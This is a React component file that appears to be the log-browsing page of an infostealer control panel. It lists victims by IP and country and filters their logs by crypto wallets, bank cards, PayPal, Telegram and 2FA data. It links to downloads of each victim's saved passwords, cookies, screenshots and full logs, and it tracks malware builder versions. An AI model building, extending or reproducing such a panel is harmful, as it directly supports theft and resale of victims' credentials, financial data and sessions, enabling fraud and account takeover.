import React, { useEffect, useState } from 'react';
import ReactPaginate from 'react-paginate';
import DateRangePicker from 'react-bootstrap-daterangepicker';
import ReactCountryFlag from "react-country-flag";

import languagesTranslate from '../../common/languages'
import ShowLogInformation from '../ShowLogInformation';
import ShowLogScreenshot from '../ShowLogScreenshot';
import ShowLogPasswords from '../ShowLogPasswords';
import ShowLogSites from '../ShowLogSites';

import { toast } from 'react-toastify';
import { connect } from 'react-redux';
import { parseDate, parseFullTime } from '../../common/utils';
import { getOwnAllLogs, changeAllLogsFilter, changeLog, saveLogChanges, downloadFilteredLogs } from '../../store/actions/logs.actions'
import { useLocation } from 'react-router';
import { baseUrl } from '../../common/config';
import { Link } from 'react-router-dom';

export default connect((s) => ({
  user: s.user.state,
  allLogs: s.logs.all,
  allForDownload: s.logs.forDownload.state,
  marks: s.marks.state,
  builderUpdates: s.builder.updates,

}), {
  getOwnAllLogs,
  changeAllLogsFilter,
  changeLog,
  saveLogChanges,
  downloadFilteredLogs
})(
  ({
    CurrentLanguage_G,

    user,
    allLogs,
    allForDownload,
    marks,
    builderUpdates,

    getOwnAllLogs,
    changeAllLogsFilter,
    changeLog,
    saveLogChanges,
    downloadFilteredLogs
  }) => {
    const location = useLocation();
    const [Downloaded, changeDownloaded] = useState(false)
    const [CurrentPage, changeCurrentPage] = useState(1)
    const [ShowLogInformationModal, changeShowLogInformationModal] = useState({
      information: '',
      show: false
    })
    const [ShowLogScreenshotModal, changeShowLogScreenshotModal] = useState({
      screenshot: '',
      show: false
    })
    const [ShowLogPasswordsModal, changeShowLogPasswordsModal] = useState({
      staticMarks: [],
      passwords: [],
      show: false
    })
    const [ShowLogSitesModal, changeShowLogSitesModal] = useState({
      logId: 0,
      logCountry: [],
      logIp: '',
      sites: [],
      show: false
    })

    const handlePageChange = (page) => {

      changeCurrentPage(page);

      if (allLogs.state.length != allLogs.all && CurrentPage == (allLogs.state.length / allLogs.filter.ShowOnPage) - 1)
        getOwnAllLogs({
          ...allLogs.filter,
          country: allLogs.filter.country == 'all' ? '' : allLogs.filter.country,
          important: allLogs.filter.important == 'all' ? '' : allLogs.filter.important,
          mark: allLogs.filter.mark == 'all' ? '' : allLogs.filter.mark,
          token: user.token,
          from: allLogs.state.length
        })

    }

    const refreshForFilter = () => {
      getOwnAllLogs({
        ...allLogs.filter,
        country: allLogs.filter.country == 'all' ? '' : allLogs.filter.country,
        important: allLogs.filter.important == 'all' ? '' : allLogs.filter.important,
        mark: allLogs.filter.mark == 'all' ? '' : allLogs.filter.mark,
        token: user.token
      })
    }

    const downloadLogs = () => {

      downloadFilteredLogs({
        ...allLogs.filter,
        country: allLogs.filter.country == 'all' ? '' : allLogs.filter.country,
        important: allLogs.filter.important == 'all' ? '' : allLogs.filter.important,
        mark: allLogs.filter.mark == 'all' ? '' : allLogs.filter.mark,
        token: user.token
      })

      changeDownloaded(true)

    }

    const closeOpenLogs = () => {
      for (let i = 0; i < allLogs.state.filter(v => v.open).length; i++)
        changeLog({ id: allLogs.state.filter(v => v.open)[i].id, name: 'open', value: false })
    }

    const showInformation = (information) => {
      changeShowLogInformationModal({ show: true, information: information })
      closeOpenLogs()
    }
    const showScreenshot = (screenshot) => {
      changeShowLogScreenshotModal({ show: true, screenshot: screenshot })
      closeOpenLogs()
    }
    const showPasswords = (passwords, staticMarks) => {
      changeShowLogPasswordsModal({ show: true, passwords, staticMarks: staticMarks.split(',') })
      closeOpenLogs()
    }
    const showSites = (logCountry, logId, logIp, sites) => {
      changeShowLogSitesModal({ show: true, logCountry, logId, logIp, sites })
      closeOpenLogs()
    }

    useEffect(() => {

      if (Downloaded) {
        toast.success('Архивы для скачивания обрабатываются!', {
          position: "top-center",
          autoClose: 5000,
          hideProgressBar: false,
          closeOnClick: true,
          pauseOnHover: true,
          draggable: true,
          progress: undefined,
        });
        changeDownloaded(false)
      }

    }, [allForDownload])

    useEffect(() => {

      if (location.state?.id) {
        changeAllLogsFilter({ name: 'id', value: location.state.id })
        refreshForFilter()
      }

    }, [])

    return (
      <section className="content">
        {
          ShowLogInformationModal.show
            ? <ShowLogInformation
              CurrentLanguage_G={CurrentLanguage_G}
              information={ShowLogInformationModal.information}
              onOutsideClick={() => changeShowLogInformationModal({ show: false, information: '' })}
            />
            : null
        }
        {
          ShowLogScreenshotModal.show
            ? <ShowLogScreenshot
              CurrentLanguage_G={CurrentLanguage_G}
              screenshot={ShowLogScreenshotModal.screenshot}
              onOutsideClick={() => changeShowLogScreenshotModal({ show: false, screenshot: '' })}
            />
            : null
        }
        {
          ShowLogPasswordsModal.show
            ? <ShowLogPasswords
              CurrentLanguage_G={CurrentLanguage_G}
              passwords={ShowLogPasswordsModal.passwords}
              staticMarks={ShowLogPasswordsModal.staticMarks}
              onOutsideClick={() => changeShowLogPasswordsModal({ show: false, staticMarks: [], passwords: [], })}
            />
            : null
        }
        {
          ShowLogSitesModal.show
            ? <ShowLogSites
              CurrentLanguage_G={CurrentLanguage_G}
              logCountry={ShowLogSitesModal.logCountry}
              logId={ShowLogSitesModal.logId}
              logIp={ShowLogSitesModal.logIp}
              sites={ShowLogSitesModal.sites}
              onOutsideClick={() => changeShowLogSitesModal({ logId: 0, logCountry: [], logIp: '', sites: [], show: false })}
            />
            : null
        }
        <div className="body_scroll">
          <div className="block-header">
            <div className="row">
              <div className="col-lg-7 col-md-6 col-sm-12">
                <h2>{languagesTranslate[CurrentLanguage_G].allLogsPage.header}</h2>
                <ul className="breadcrumb">
                  <li className="breadcrumb-item"><a href="index.html"><i className="zmdi zmdi-home"></i> RiseTop</a>
                  </li>
                  <li className="breadcrumb-item">{languagesTranslate[CurrentLanguage_G].allLogsPage.pathItem1}</li>
                  <li className="breadcrumb-item active">{languagesTranslate[CurrentLanguage_G].allLogsPage.pathItem2}</li>
                </ul>
                <button className="btn btn-primary btn-icon mobile_menu" type="button"><i
                  className="zmdi zmdi-sort-amount-desc"></i></button>
              </div>
            </div>
          </div>

          <div class="container-fluid">
            <div class="row clearfix">
              <div class="col-lg-12 col-md-12">
                <div class="card">
                  <div class="header">
                    <h2><strong>{languagesTranslate[CurrentLanguage_G].allLogsPage.logs}</strong></h2>
                  </div>
                  <div class="body">
                    <div class="row mb-2">
                      {
                        (user.permissions.ID && user.role == 'worker') || user.role != 'worker'
                          ? <div class="col-lg-1 pr-1 col-md-4">
                            <div class="form-group">
                              <input type="text" class="form-control" placeholder={languagesTranslate[CurrentLanguage_G].allLogsPage.id} value={allLogs.filter.id} onChange={e => changeAllLogsFilter({ name: 'id', value: e.target.value })} />
                            </div>
                          </div>
                          : null
                      }
                      {
                        (user.permissions.startID && user.role == 'worker') || user.role != 'worker'
                          ? <div class="col-lg-1 pr-1 pl-1 col-md-4">
                            <div class="form-group">
                              <input type="text" class="form-control" placeholder={languagesTranslate[CurrentLanguage_G].allLogsPage.fromId} value={allLogs.filter.fromId} onChange={e => changeAllLogsFilter({ name: 'fromId', value: e.target.value })} />
                            </div>
                          </div>
                          : null
                      }
                      {
                        (user.permissions.IP && user.role == 'worker') || user.role != 'worker'
                          ? <div class="col-lg-1 pr-1 pl-1 col-md-4">
                            <div class="form-group">
                              <input type="text" class="form-control" placeholder={languagesTranslate[CurrentLanguage_G].allLogsPage.ip} value={allLogs.filter.ip} onChange={e => changeAllLogsFilter({ name: 'ip', value: e.target.value })} />
                            </div>
                          </div>
                          : null
                      }
                      <div class="col-lg-2 pr-1 pl-1 col-md-12">
                        <div class="form-group">
                          <select class="custom-select" value={allLogs.filter.country} onChange={e => changeAllLogsFilter({ name: 'country', value: e.target.value })}>
                            <option value={'all'}>{languagesTranslate[CurrentLanguage_G].allLogsPage.allCountries}</option>
                            <option value={'US'}>US</option>
                            <option value={'RU'}>RU</option>
                            <option value={'KZ'}>KZ</option>
                          </select>
                        </div>
                      </div>
                      {
                        (user.permissions.note && user.role == 'worker') || user.role != 'worker'
                          ? <div class="col-lg-1 pr-1 pl-1 col-md-4">
                            <div class="form-group">
                              <input type="text" class="form-control" placeholder={languagesTranslate[CurrentLanguage_G].allLogsPage.note} value={allLogs.filter.note} onChange={e => changeAllLogsFilter({ name: 'note', value: e.target.value })} />
                            </div>
                          </div>
                          : null
                      }
                      <div class="col-lg-1 pr-1 pl-1 col-md-4">
                        <div class="form-group">
                          <input type="text" class="form-control" placeholder={languagesTranslate[CurrentLanguage_G].allLogsPage.cookie} value={allLogs.filter.cookie} onChange={e => changeAllLogsFilter({ name: 'cookie', value: e.target.value })} />
                        </div>
                      </div>
                      <div class="col-lg-1 pr-1 pl-1 col-md-4">
                        <div class="form-group">
                          <input type="text" class="form-control" placeholder={languagesTranslate[CurrentLanguage_G].allLogsPage.sites} value={allLogs.filter.sites} onChange={e => changeAllLogsFilter({ name: 'sites', value: e.target.value })} />
                        </div>
                      </div>
                      <div class="col pr-1 pl-1 col-md-0">
                        <div className="d-flex justify-content-end">
                          <button type="button" class="btn btn-default" onClick={refreshForFilter}>
                            <span class="btn-label">
                              <i class="zmdi zmdi-refresh"></i>
                            </span>
                          </button>
                          <button type="button" class="btn btn-primary" onClick={downloadLogs}>
                            <span class="btn-label">
                              <i class="zmdi zmdi-download"></i>
                            </span>
                          </button>
                        </div>
                      </div>
                    </div>
                    <div class="row mb-2">
                      <div class="col-lg-3 pr-1 col-md-12">
                        <DateRangePicker
                          initialSettings={{ startDate: allLogs.filter.dateFrom ? new Date(allLogs.filter.dateFrom) : new Date(), endDate: allLogs.filter.dateTo ? new Date(allLogs.filter.dateTo) : new Date() }}
                          onApply={(event, { startDate, endDate }) => {
                            changeAllLogsFilter({ name: 'dateFrom', value: startDate.toDate() })
                            changeAllLogsFilter({ name: 'dateTo', value: endDate.toDate() })
                          }}
                        >
                          <div>
                            <div class="input-group">
                              <div class="input-group-prepend">
                                <span class="input-group-text" id="">{languagesTranslate[CurrentLanguage_G].WorkersLogsPage.date}</span>
                              </div>
                              <input type="text" class="form-control" readOnly value={parseDate(allLogs.filter.dateFrom)} />
                              <input type="text" class="form-control" readOnly value={parseDate(allLogs.filter.dateTo)} />
                            </div>
                          </div>
                        </DateRangePicker>
                      </div>
                      {
                        (user.permissions.important && user.role == 'worker') || user.role != 'worker'
                          ? <div class="col-lg-3 pr-1 col-md-12 form-control d-flex">
                            <span>Важные</span>
                            <div className="flex-fill text-center">
                              <div class="form-check form-check-inline mr-1">
                                <input class="form-check-input" type="radio" id="important1" checked={allLogs.filter.important == 'all' ? true : false} value="all" onChange={e => changeAllLogsFilter({ name: 'important', value: e.target.value })} />
                                <label class="form-check-label" for="important1">{languagesTranslate[CurrentLanguage_G].allLogsPage.allImportant}</label>
                              </div>
                              <div class="form-check form-check-inline mr-1">
                                <input class="form-check-input" type="radio" id="important2" checked={allLogs.filter.important == 1 ? true : false} value="1" onChange={e => changeAllLogsFilter({ name: 'important', value: parseInt(e.target.value) })} />
                                <label class="form-check-label" for="important2">1+</label>
                              </div>
                              <div class="form-check form-check-inline mr-1">
                                <input class="form-check-input" type="radio" id="important3" checked={allLogs.filter.important == 2 ? true : false} value="2" onChange={e => changeAllLogsFilter({ name: 'important', value: parseInt(e.target.value) })} />
                                <label class="form-check-label" for="important3">2+</label>
                              </div>
                              <div class="form-check form-check-inline mr-1">
                                <input class="form-check-input" type="radio" id="important4" checked={allLogs.filter.important == 3 ? true : false} value="3" onChange={e => changeAllLogsFilter({ name: 'important', value: parseInt(e.target.value) })} />
                                <label class="form-check-label" for="important4">3+</label>
                              </div>
                              <div class="form-check form-check-inline mr-1">
                                <input class="form-check-input" type="radio" id="important5" checked={allLogs.filter.important == 5 ? true : false} value="5" onChange={e => changeAllLogsFilter({ name: 'important', value: parseInt(e.target.value) })} />
                                <label class="form-check-label" for="important5">5+</label>
                              </div>
                            </div>
                          </div>
                          : null
                      }
                      <div class="col-lg-2 pr-1 pl-1 col-md-12">
                        <div class="form-group">
                          <select class="custom-select" value={allLogs.filter.mark} onChange={e => changeAllLogsFilter({ name: 'mark', value: e.target.value })}>
                            <option value={'all'}>{languagesTranslate[CurrentLanguage_G].allLogsPage.allMarks}</option>
                            {
                              marks.map((v, i) => <option key={i} value={v._id}>{v.name}</option>)
                            }
                          </select>
                        </div>
                      </div>
                      <div class="col-lg-8 pr-1 col-md-4">
                        {
                          (user.permissions.wallets && user.role == 'worker') || user.role != 'worker'
                            ? <div class="form-check form-check-inline">
                              <input class="form-check-input" type="checkbox" id="inlineCheckbox1" checked={allLogs.filter.wallets} onChange={e => changeAllLogsFilter({ name: 'wallets', value: e.target.checked ? true : '' })} />
                              <label class="form-check-label" for="inlineCheckbox1">{languagesTranslate[CurrentLanguage_G].allLogsPage.wallets}</label>
                            </div>
                            : null
                        }
                        {
                          (user.permissions.bankCards && user.role == 'worker') || user.role != 'worker'
                            ? <div class="form-check form-check-inline">
                              <input class="form-check-input" type="checkbox" id="inlineCheckbox2" checked={allLogs.filter.cards} onChange={e => changeAllLogsFilter({ name: 'cards', value: e.target.checked ? true : '' })} />
                              <label class="form-check-label" for="inlineCheckbox2">{languagesTranslate[CurrentLanguage_G].allLogsPage.cards}</label>
                            </div>
                            : null
                        }
                        {
                          (user.permissions.empty && user.role == 'worker') || user.role != 'worker'
                            ? <div class="form-check form-check-inline">
                              <input class="form-check-input" type="checkbox" id="inlineCheckbox3" checked={allLogs.filter.hideEmpty} onChange={e => changeAllLogsFilter({ name: 'hideEmpty', value: e.target.checked ? true : '' })} />
                              <label class="form-check-label" for="inlineCheckbox3">{languagesTranslate[CurrentLanguage_G].allLogsPage.hideEmpty}</label>
                            </div>
                            : null
                        }
                        {
                          (user.permissions.telegram && user.role == 'worker') || user.role != 'worker'
                            ? <div class="form-check form-check-inline">
                              <input class="form-check-input" type="checkbox" id="inlineCheckbox4" checked={allLogs.filter.telegram} onChange={e => changeAllLogsFilter({ name: 'telegram', value: e.target.checked ? true : '' })} />
                              <label class="form-check-label" for="inlineCheckbox4">{languagesTranslate[CurrentLanguage_G].allLogsPage.telegram}</label>
                            </div>
                            : null
                        }
                        {
                          (user.permissions.twoFA && user.role == 'worker') || user.role != 'worker'
                            ? <div class="form-check form-check-inline">
                              <input class="form-check-input" type="checkbox" id="inlineCheckbox5" checked={allLogs.filter.twoFA} onChange={e => changeAllLogsFilter({ name: 'twoFA', value: e.target.checked ? true : '' })} />
                              <label class="form-check-label" for="inlineCheckbox5">{languagesTranslate[CurrentLanguage_G].allLogsPage.twoFA}</label>
                            </div>
                            : null
                        }
                        {
                          (user.permissions.notDownloaded && user.role == 'worker') || user.role != 'worker'
                            ? <div class="form-check form-check-inline">
                              <input class="form-check-input" type="checkbox" id="inlineCheckbox6" checked={allLogs.filter.notDownloaded} onChange={e => changeAllLogsFilter({ name: 'notDownloaded', value: e.target.checked ? true : '' })} />
                              <label class="form-check-label" for="inlineCheckbox6">{languagesTranslate[CurrentLanguage_G].allLogsPage.notDownloaded}</label>
                            </div>
                            : null
                        }
                        {
                          (user.permissions.favorites && user.role == 'worker') || user.role != 'worker'
                            ? <div class="form-check form-check-inline">
                              <input class="form-check-input" type="checkbox" id="inlineCheckbox7" checked={allLogs.filter.favorite} onChange={e => changeAllLogsFilter({ name: 'favorite', value: e.target.checked ? true : '' })} />
                              <label class="form-check-label" for="inlineCheckbox7">{languagesTranslate[CurrentLanguage_G].allLogsPage.favorite}</label>
                            </div>
                            : null
                        }
                        {
                          (user.permissions.unique && user.role == 'worker') || user.role != 'worker'
                            ? <div class="form-check form-check-inline">
                              <input class="form-check-input" type="checkbox" id="inlineCheckbox8" checked={allLogs.filter.unique} onChange={e => changeAllLogsFilter({ name: 'unique', value: e.target.checked ? true : '' })} />
                              <label class="form-check-label" for="inlineCheckbox8">{languagesTranslate[CurrentLanguage_G].allLogsPage.unique}</label>
                            </div>
                            : null
                        }
                        {
                          (user.permissions.globalDuplicates && user.role == 'worker') || user.role != 'worker'
                            ? <div class="form-check form-check-inline">
                              <input class="form-check-input" type="checkbox" id="inlineCheckbox9" checked={allLogs.filter.hideGlobalDubliacte} onChange={e => changeAllLogsFilter({ name: 'hideGlobalDubliacte', value: e.target.checked ? true : '' })} />
                              <label class="form-check-label" for="inlineCheckbox9">{languagesTranslate[CurrentLanguage_G].allLogsPage.hideGlobalDuplicates}</label>
                            </div>
                            : null
                        }
                        <div class="form-check form-check-inline">
                          <input class="form-check-input" type="checkbox" id="inlineCheckbox10" checked={allLogs.filter.authy} onChange={e => changeAllLogsFilter({ name: 'authy', value: e.target.checked ? true : '' })} />
                          <label class="form-check-label" for="inlineCheckbox10">Authy</label>
                        </div>
                        {
                          (user.permissions.paypal && user.role == 'worker') || user.role != 'worker'
                            ? <div class="form-check form-check-inline">
                              <input class="form-check-input" type="checkbox" id="inlineCheckbox11" checked={allLogs.filter.paypal} onChange={e => changeAllLogsFilter({ name: 'paypal', value: e.target.checked ? true : '' })} />
                              <label class="form-check-label" for="inlineCheckbox11">Paypal</label>
                            </div>
                            : null
                        }
                      </div>
                    </div>
                    <div className="row">
                      <div className="col-7">
                        <div className="w-100 h-100 d-flex align-items-center">
                          <span>{languagesTranslate[CurrentLanguage_G].allLogsPage.showText}</span>
                          <div class="form-group d-inline-block mr-1 ml-1 mb-0">
                            <select class="custom-select" value={allLogs.filter.ShowOnPage} onChange={e => changeAllLogsFilter({ name: 'ShowOnPage', value: parseInt(e.target.value) })}>
                              <option value={'25'}>25</option>
                              <option value={'50'}>50</option>
                              <option value={'75'}>75</option>
                              <option value={'100'}>100</option>
                            </select>
                          </div>
                          <span>{languagesTranslate[CurrentLanguage_G].allLogsPage.results}</span>
                          <span className={'ml-2 text-muted'}>{languagesTranslate[CurrentLanguage_G].allLogsPage.show(((CurrentPage - 1) * allLogs.filter.ShowOnPage) + 1, CurrentPage * allLogs.filter.ShowOnPage, allLogs.all)}</span>
                        </div>
                      </div>
                      <div className="col-5">
                        <ReactPaginate
                          previousLinkClassName={'btn btn-secondary previous'}
                          previousLabel={languagesTranslate[CurrentLanguage_G].WorkersLogsPage.previous}
                          nextLinkClassName={'btn btn-secondary next'}
                          nextLabel={languagesTranslate[CurrentLanguage_G].WorkersLogsPage.next}
                          breakLabel={'...'}
                          breakClassName={'break-me'}
                          pageCount={Math.ceil(allLogs.all / allLogs.filter.ShowOnPage)}
                          marginPagesDisplayed={2}
                          pageRangeDisplayed={5}
                          onPageChange={(page) => handlePageChange(page.selected + 1)}
                          containerClassName={'pagination justify-content-end'}
                          activeClassName={'active'}
                          pageLinkClassName={'num'}
                        />
                      </div>
                    </div>
                    <table class="table table-bordered">
                      <thead>
                        <tr>
                          <th></th>
                          <th>{languagesTranslate[CurrentLanguage_G].allLogsPage.id}</th>
                          <th>{languagesTranslate[CurrentLanguage_G].allLogsPage.data}</th>
                          <th>{languagesTranslate[CurrentLanguage_G].allLogsPage.note}</th>
                          <th>{languagesTranslate[CurrentLanguage_G].allLogsPage.logs}</th>
                          <th>{languagesTranslate[CurrentLanguage_G].allLogsPage.countryAndIp}</th>
                          <th>{languagesTranslate[CurrentLanguage_G].allLogsPage.date}</th>
                        </tr>
                      </thead>
                      <tbody>
                        {
                          allLogs.state.map((v, i) =>
                            i < CurrentPage * allLogs.filter.ShowOnPage && i >= (CurrentPage - 1) * allLogs.filter.ShowOnPage
                              ? <tr key={i}>
                                <th scope="row" className={'h-100 text-center'}>
                                  <i className="cursor-pointer position-relative zmdi zmdi-plus-circle-o" style={{ color: 'green' }} onClick={e => changeLog({ id: v.id, name: 'open', value: !v.open ? true : false })}>                          </i>
                                  {
                                    v.open
                                      ? <div className="log-tooltip">

                                        <div className="d-flex w-100">
                                          <div className="flex-grow-1 p-2 border-right border-dark d-flex align-items-center justify-content-center">
                                            {languagesTranslate[CurrentLanguage_G].allLogsPage.data}
                                          </div>
                                          <div className="flex-grow-1 p-2">
                                            <div className="d-flex align-items-center">
                                              <button onClick={() => showPasswords(v.passwords, user.settings.staticMarks)} class="btn btn-primary">{languagesTranslate[CurrentLanguage_G].allLogsPage.savedPasswords}</button>
                                              <button onClick={() => showSites(v.country, v.id, v.ip, v.cookiesSites)} class="ml-2 btn btn-info">{languagesTranslate[CurrentLanguage_G].allLogsPage.cookieSites}</button>
                                            </div>
                                          </div>
                                        </div>

                                        <div className="d-flex w-100">
                                          <div className="flex-grow-1 p-2 border-right border-bottom border-top border-dark d-flex align-items-center justify-content-center">
                                            Machine ID
                                          </div>
                                          <div className="flex-grow-1 p-2 border-bottom border-top border-dark">
                                            <span>{v.machineId}</span>
                                          </div>
                                        </div>

                                        <div className="d-flex w-100">
                                          <div className="flex-grow-1 p-2 border-right border-dark d-flex align-items-center justify-content-center">
                                            Cookies
                                          </div>
                                          <div className="flex-grow-1 p-2 row">
                                            {
                                              v.cookies.map((cv, сi) => cv.size > 0
                                                ? <div key={сi} className={'col-6 d-inline-flex align-items-center'}>
                                                  <a href={`${baseUrl}logs/download-cookie?_id=${user._id}&id=${v.id}&name=${cv.name}`}>
                                                    <button class="btn btn-primary">{cv.name}({(cv.size / 1024).toFixed(1)}Kb)</button>
                                                  </a>
                                                  <a href={`${baseUrl}logs/download-cookie?_id=${user._id}&id=${v.id}&name=${cv.name}&json=true`}>
                                                    <span className={'cursor-pointer ml-2'}>Json</span>
                                                  </a>
                                                  <div className="ml-2 d-inline-flex">
                                                    <i class="zmdi zmdi-download text-secondary"></i>
                                                    <span className={'text-secondary'}>{cv.downloads}</span>
                                                  </div>
                                                </div>
                                                : null
                                              )
                                            }
                                          </div>
                                        </div>

                                      </div>
                                      : null
                                  }
                                </th>
                                <th className={'text-center'}>
                                  <span>{v.id}</span>
                                  <span style={{ color: !v.globalduplicate && !v.localduplicate ? 'green' : v.globalduplicate ? "yellow" : 'red' }}>☻</span>
                                </th>
                                <td>
                                  <div className="d-flex">
                                    <div className={'d-flex'}>
                                      <div className={v.passwords.length > 0 ? "p-1 bg-primary rounded" : "p-1 bg-secondary rounded"}>
                                        <i className={v.passwords.length > 0 ? "zmdi zmdi-key text-light" : "zmdi zmdi-key text-body"}></i>
                                        <span className={v.passwords.length > 0 ? "ml-1 text-light" : "ml-1 text-body"}>{v.passwords.length}</span>
                                      </div>
                                      <div className="p-1">
                                        <a href={`${baseUrl}logs/download-passwords?_id=${user._id}&id=${v.id}&pattern={soft}:{url}:{user}:{pass}`} download className={'mb-3'}>
                                          <i className={"cursor-pointer zmdi zmdi-download text-body"}></i>
                                        </a>
                                      </div>
                                    </div>
                                    <div className={'d-flex ml-2'}>
                                      <div className={v.wallets > 0 ? "p-1 bg-primary rounded" : "p-1"}>
                                        <i className={v.wallets > 0 ? "zmdi zmdi-balance-wallet text-light" : "zmdi zmdi-balance-wallet text-body"}></i>
                                        <span className={v.wallets > 0 ? "ml-1 text-light" : "ml-1 text-body"}>{v.wallets}</span>
                                      </div>
                                    </div>
                                    <div className={'d-flex ml-2'}>
                                      <div className={v.cards.length > 0 ? "p-1 bg-primary rounded" : "p-1"}>
                                        <i className={v.cards.length > 0 ? "zmdi zmdi-card text-light" : "zmdi zmdi-card text-body"}></i>
                                        <span className={v.cards.length > 0 ? "ml-1 text-light" : "ml-1 text-body"}>{v.cards.length}</span>
                                      </div>
                                    </div>
                                    <div className={'d-flex ml-2'}>
                                      <div className={v.files.length > 0 ? "p-1 bg-primary rounded" : "p-1"}>
                                        <i className={v.files.length > 0 ? "zmdi zmdi-file text-light" : "zmdi zmdi-file text-body"}></i>
                                        <span className={v.files.length > 0 ? "ml-1 text-light" : "ml-1 text-body"}>{v.files.length}</span>
                                      </div>
                                    </div>
                                    <div className={'d-flex ml-2'}>
                                      <div className={v.important > 0 ? "p-1 bg-warning rounded" : "p-1"}>
                                        <i className={v.important > 0 ? "zmdi zmdi-alert-circle text-light" : "zmdi zmdi-alert-circle text-body"}></i>
                                        <span className={v.important > 0 ? "ml-1 text-light" : "ml-1 text-body"}>{v.important}</span>
                                      </div>
                                    </div>
                                  </div>
                                  <div className={"d-flex mt-1"}>
                                    <div className={'d-flex'}>
                                      <i className={v.passwords.find(v => v.host.indexOf('paypal') != -1) ? "zmdi zmdi-paypal-alt text-primary" : "zmdi zmdi-paypal-alt text-body"}></i>
                                    </div>
                                    <div className={'d-flex ml-2'}>
                                      <span style={{ fontFamily: 'AT Open Sans' }} className={'font-weight-bold text-secondary'}>Cookies: {v.cookiesCount}</span>
                                    </div>
                                    <div className={'d-flex ml-2'}>
                                      <span style={{ fontFamily: 'AT Open Sans' }} className={'font-weight-bold text-secondary'}>{languagesTranslate[CurrentLanguage_G].allLogsPage.history}: {v.historyCount}</span>
                                    </div>
                                  </div>
                                </td>
                                <td>
                                  <div class="form-check form-check-inline">
                                    <input class="form-check-input" type="checkbox" id="inlineCheckbox22" checked={v.favorite ? true : false} onChange={e => changeLog({ id: v.id, name: 'favorite', value: e.target.checked ? true : '' })} />
                                    <label class="form-check-label" for="inlineCheckbox22">{languagesTranslate[CurrentLanguage_G].allLogsPage.favoriteLog}</label>
                                  </div>
                                  <div class="input-group">
                                    <textarea class="form-control" cols="10" rows="2" value={v.note} onChange={e => changeLog({ id: v.id, name: 'note', value: e.target.value })}></textarea>
                                    <div class="input-group-append">
                                      <button class="btn btn-outline-secondary pr-2 pl-2" onClick={() => saveLogChanges({ token: user.token, id: v.id, note: v.note, favorite: v.favorite })}>
                                        <i className={"zmdi zmdi-cloud-upload"}></i>
                                      </button>
                                    </div>
                                  </div>
                                </td>
                                <td>
                                  <div className="d-flex align-items-center justify-content-center">
                                    <a href={`${baseUrl}logs/download-log?_id=${user._id}&id=${v.id}`}>
                                      <button class="btn btn-primary">{languagesTranslate[CurrentLanguage_G].allLogsPage.download}</button>
                                    </a>
                                    <Link className={'ml-2'} to={{
                                      pathname: '/logs-files',
                                      state: {
                                        id: v.id
                                      }
                                    }}>
                                      <i class="zmdi zmdi-folder text-body"></i>
                                    </Link>
                                    <div className="ml-2">
                                      <i class="cursor-pointer zmdi zmdi-alert-circle text-body" onClick={() => showInformation(v.information)}></i>
                                    </div>
                                    <div className="ml-2">
                                      <i class="cursor-pointer zmdi zmdi-picture-in-picture text-body" onClick={() => showScreenshot(v.screenshotLink)}></i>
                                    </div>
                                  </div>
                                  <div className="mt-1 d-flex align-items-center justify-content-center">
                                    <div className="ml-2">
                                      <i class="zmdi zmdi-download text-secondary"></i>
                                      <span className={'text-secondary'}>{v.stats.downloads}</span>
                                    </div>
                                    <div className="ml-2">
                                      <i class="zmdi zmdi-file-plus text-secondary"></i>
                                      <span className={'text-secondary'}>{((v.stats.size) / (1024 * 1024)).toFixed(1)}Mb</span>
                                    </div>
                                    <div className="ml-2">
                                      <i class={builderUpdates[0] && parseFloat(builderUpdates[0].version) > parseFloat(v.builderVersion) ? "zmdi zmdi-alert-triangle text-danger" : "zmdi zmdi-alert-triangle text-success"}></i>
                                      <span className={builderUpdates[0] && parseFloat(builderUpdates[0].version) > parseFloat(v.builderVersion) ? "text-danger" : 'text-success'}>{v.builderVersion}</span>
                                    </div>
                                  </div>
                                </td>
                                <td>
                                  <div className={'h-100 d-flex justify-content-center align-items-center flex-column'}>
                                    <span>
                                      <ReactCountryFlag
                                        countryCode={v.country}
                                        svg
                                        cdnUrl="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.4.3/flags/1x1/"
                                        cdnSuffix="svg"
                                      />
                                      {v.country}
                                    </span>
                                    <span>{v.ip}</span>
                                  </div>
                                </td>
                                <td className={'text-center'}>{parseFullTime(v.createdAt)}</td>
                              </tr>
                              : null
                          )
                        }
                      </tbody>
                    </table>
                  </div>
                </div>
              </div>
            </div>
          </div>

        </div>
      </section >
    )

  }
);